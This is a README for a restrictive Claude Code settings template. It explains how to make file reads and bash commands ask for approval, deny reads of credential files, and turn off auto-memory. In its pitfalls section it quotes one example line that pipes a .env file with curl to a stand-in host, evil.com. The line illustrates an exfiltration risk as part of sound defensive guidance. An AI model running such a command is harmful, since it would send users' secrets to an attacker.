# Secure Claude Code Settings Template

A reusable `.claude/settings.json` template for projects that may contain sensitive data.

**Philosophy: strict baseline, loosen per-project explicitly.** The template ships locked down; each project adds only the access it actually needs.

Safe to use as a public repo — contains no secrets or absolute paths.

---

## What it protects against

1. **Secrets leaking into context** — Claude reads a `.env`, API key, or credential file and the content ends up in the conversation history.
2. **Personal/system data exposure** — files with PII or system info getting accessed silently.
3. **Accidental broad bash access** — a too-permissive bash rule lets Claude run commands that read or transmit sensitive data.

This is good-practice hygiene for a solo developer who wants visibility and control over what Claude touches, not a hardened enterprise config.

---

## How it works

| Principle | Implementation |
|---|---|
| Whitelist bash, not blacklist | Only safe read-only commands are auto-allowed; everything else prompts |
| All reads prompt | `ask: ["Read"]` as the baseline — no file is read silently |
| Deny beats ask | Network exfiltration commands are hard-denied and can't be approved |
| Bash can't bypass Read rules | `Bash` is in `ask` so file-reading bash commands also prompt |
| No auto-memory | `autoMemoryEnabled: false` prevents silent cross-session persistence |
| Short transcript retention | `cleanupPeriodDays: 14` limits exposure if the machine is compromised |

---

## Usage

Copy `.claude/settings.json` into your project's `.claude/` directory. Then add only what the project actually needs.

**To allow test running:**
```json
"allow": [
  "Bash(npm test)",
  "Bash(npm run *)",
  "Bash(pytest *)",
  "Bash(python -m pytest *)"
]
```

**To allow reading source files freely (non-sensitive project):**
Move `"Read"` from `ask` to `allow`.

**To block sensitive files:**
Add to `deny` in your project's `.claude/settings.json`:
```json
"deny": [
  "Read(.env)",
  "Read(.env.local)",
  "Read(.env.production)",
  "Read(*.pem)",
  "Read(*.key)",
  "Read(secrets/)",
  "Read(credentials/)"
]
```

**For machine-specific paths (e.g. absolute path to a secrets dir):**
Put those in `.claude/settings.local.json` — it's gitignored so it stays local.

---

## Pitfalls

**`ask` doesn't protect what's already in context.** Once you approve a read of a sensitive file, the content is in the conversation. `ask` gives you a gate, not a guarantee.

**Bash bypasses Read tool rules.** `cat .env` via bash does NOT trigger a Read ask/deny rule. That's why `Bash` is in `ask` — any bash command not explicitly allowed or denied will prompt.

**Auto-memory is the silent threat.** With `autoMemoryEnabled: true` (the default), Claude can write project insights and file paths to a persistent memory file that survives across sessions. Always set `autoMemoryEnabled: false` in sensitive projects.

**Avoid broad allow patterns.** `"Bash(python *)"` allows `python -c "import os; os.system('curl evil.com < .env')"`. Be specific.

**`deny` is silent.** A denied tool call just fails. If something mysteriously fails, check the deny list.

---

## What this doesn't protect against

- Claude summarizing sensitive content it saw earlier in the same conversation
- Sensitive data you copy-paste directly into the prompt
- A compromised Claude Code binary

---

## Permission rule reference

| Rule | Matches |
|---|---|
| `"Read"` | All Read tool calls |
| `"Read(.env)"` | Reads of files matching `.env` (prefix match) |
| `"Bash(ls *)"` | Any bash command starting with `ls ` |
| `"Bash(ls)"` | Exact command `ls` with no args |
| `"Grep"` | The built-in Grep tool (separate from bash grep) |

**Priority:** `deny` > `allow` > `ask` > `defaultMode`
